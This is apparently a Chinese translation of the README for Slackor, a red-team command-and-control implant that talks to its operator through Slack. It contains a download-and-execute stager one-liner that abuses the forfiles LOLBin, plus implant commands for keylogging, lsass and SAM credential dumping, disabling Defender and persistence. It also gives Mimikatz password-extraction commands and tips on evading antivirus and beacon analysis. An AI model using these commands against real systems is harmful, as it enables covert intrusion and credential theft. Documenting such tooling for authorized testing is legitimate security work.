**该项目的灵感来自[Gcat](https://github.com/byt3bl33d3r/gcat)和[Twittor](https://github.com/PaulSec/twittor)。**

![1566957526_5d65dfd6c0f21.png!small](https://image.3001.net/images/20190828/1566957526_5d65dfd6c0f21.png!small)

![1566957558_5d65dff6d060e.png!small](https://image.3001.net/images/20190828/1566957558_5d65dff6d060e.png!small)

## 编译

注意：服务器是用Python 3编写的

为此您需要准备

1.Slack工作区

2.并为slack[应用](https://api.slack.com/apps)设置以下权限：

    
    
    channels:read  
    channels:history  
    channels:write  
    files:write:user  
    files:read  
    创建一个机器人

这个仓库包含五个文件：

> `install.sh` 安装依赖
>
> `setup.py` 用于创建通道，数据库的脚本
>
> `agent.py` 用于生成后门的脚本
>
> `server.py` Slackor服务器，在Linux上运行
>
> `agent.go` golang后门
>
> `requirements.txt` Python依赖

如何开始：

    
    
    go get github.com/Coalfire-Research/Slackor  
    ​  
    cd $GOPATH/src/github.com/Coalfire-Research/Slackor  
    ​  
    install.sh  
    ​  
    setup.py

为您的应用程序提供OAuth token

成功运行脚本后，脚本将在`dist/`目录中创建几个文件：

    
    
    agent.windows.exe：Windows 64位二进制文件  
    agent.upx.exe：Windows 64位二进制文件，UPX打包  
    agent.darwin：macOS 64位二进制文件  
    agent.32.linux：Linux 32位二进制文件  
    agent.64.linux：Linux 64位二进制文件

在`server.py`Linux主机上启动后，

运行`stager`模块以生成单线程和其他dropper。

    
    
    powershell.exe iwr [URL] -o C:\Users\Public\[NAME].exe; forfiles.exe /p c:\windows\system32 /m svchost.exe /c C:\Users\Public\[NAME]; timeout 2; del C:\Users\Public\[NAME].exe

这将执行InvokeWebRequest（PS v.3 +）以下载payload，使用[LOLBin](https://lolbas-project.github.io/lolbas/Binaries/Forfiles/)执行它

## 用法

输入`help`或按`[TAB]`查看可用命令列表。输入`help [COMMAND]`以查看该命令的描述。

### Slackor

    
    
    help - 显示帮助菜单  
    interact - 与代理交互  
    list - 列出所有已注册的代理商  
    remove - 杀死并删除代理  
    revive - 向所有代理发送信号以重新注册服务器  
    stager - 生成单行程序以下载执行植  
    quit - 退出程序  
    wipefiles - 从Slack中删除所有上传的文件

代理进入后，您可以与其进行交互。使用`interact [AGENT]`进入代理提示符。输入`help`或按`[TAB]`查看可用命令列表。

### Slackor:AGENT

    
    
    - 常用命令  
      - back  - 返回主菜单  
      - beacon - 更改代理每次登记之间的时间（默认为5秒）  
      - download- 将代理程序中的文件下载到Slackor服务器  
      - help - 显示帮助菜单  
      - kill  - 杀死进程  
      - sleep - 代理睡眠一次时间（以秒为单位输入时间）  
      - sysinfo- 显示当前用户，操作系统版本，系统体系结构和CPU核心数  
      - upload - 从Slackor服务器上传文件到代理  
      - wget - 通过HTTP / HTTPS下拉任意文件  
    - Windows命令  
      - bypassuac - 生成代理  
      - cleanup - 删除持久化操作  
      - clipboard - 检索剪贴板的内容  
      - defanger - 去除Windows Defender  
      - duplicate - 使代理生成另一个自身调用  
      - getsystem - 将代理生成为NTAUTHORITY / SYSTEM  
      - keyscan - 在代理上启动键盘记录器  
      - minidump - 从lsass.exe转储内存并下载  
      - persist - 通过在ADS中植入二进制文件来创建持久性  
      - samdump - 尝试转储SAM文件以进行脱机哈希提取  
      - screenshot - 获取桌面的屏幕截图  
      - shellcode- 执行x64原始shellcode  
    - Mac命令  
    - Linux命令  
      - screenshot - 获取桌面的屏幕截图

### OPSEC注意事项

除Slack的TLS传输加密外，命令输出和下载的文件都是AES加密的。

模块将在执行写入磁盘的任务之前发出警告。执行shell命令时，请注意`cmd.exe`/
`bash`将执行。这可以在主机上监控。以下是几个不执行`cmd.exe`/的OPSEC安全命令`bash`：

    
    
    - cat - 打印文件内容  
    - cd - 更改目录  
    - find - 搜索目录文件名  
    - getip - 获取外部IP地址（发出DNS请求）  
    - hostname - 显示主机的名称  
    - ifconfig - 显示接口信息  
    - ls - 列出目录内容  
    - mkdir - 创建目录  
    - pwd - 打印当前工作目录  
    - rm - 删除文件  
    - rmdir - 删除目录  
    - whoami/getuid - 打印当前用户

## 未来的目标

> 1.DOSfuscation
>
> 2.反复加载DLL / PE - <https://github.com/vyrus001/go-mimikatz>
>
> 3.在内存中执行C＃程序集 - <https://github.com/lesnuages/go-execute-assembly>
>
> 4.源代码混淆<https://github.com/unixpickle/gobfuscate>

## 常问问题

### 这对红队/测试使用是否安全？

是的，考虑到一些条件。当数据在传输过程中加密时，代理包含用于解密的密钥。获取代理副本的任何人都可以对其进行反向工程并提取API密钥和AES密钥。任何妥协或以其他方式获得对工作区的访问权限的人都能够检索其中的所有数据。因此，不建议针对多个组织重用基础结构。

### Mimikatz怎么样？

植入物没有内存中的密码转储功能。如果您需要logonPasswords，可以尝试以下操作：

    
    
    (Slackor: AGENT)minidump

这将使用Pypykatz自动提取密码。或者，您可以在Windows上使用Mimikatz。

    
    
    >mimikatz.exe  
    mimikatz # sekurlsa::Minidump lsassdump.dmp  
    mimikatz # sekurlsa::logonPasswords

### 它是跨平台的吗？

它的跨平台支持有限。它尚未在可以运行的所有系统上进行全面测试。该服务器旨在在Kali
Linux上运行。代理程序是针对Windows，Mac和Linux编译的，但主要是使用Windows
10进行测试。代理程序可能会错误处理该代理程序平台不支持的命令（不要尝试对Mac进行小型化）。

### 它的规模如何？

可伸缩性受Slack API的限制。如果您有多个代理，请考虑增加未使用的信标的信标间隔。

### 它是否容易受到标准信标分析的影响？

目前，每个信标都内置了20％的抖动，并且可以定制信标时间。只要没有收到新命令，代理登记请求和响应数据包每次大小大致相同。

### 它被杀软发现！

现在这是开源的，它必然会有问题。我们会尽可能地修复模块，但无法保证这将始终绕过所有AV。

 **参考来源：[GitHub](https://github.com/Coalfire-Research/Slackor)，FB小编周大涛编译，转载请注明来自FreeBuf.COM**

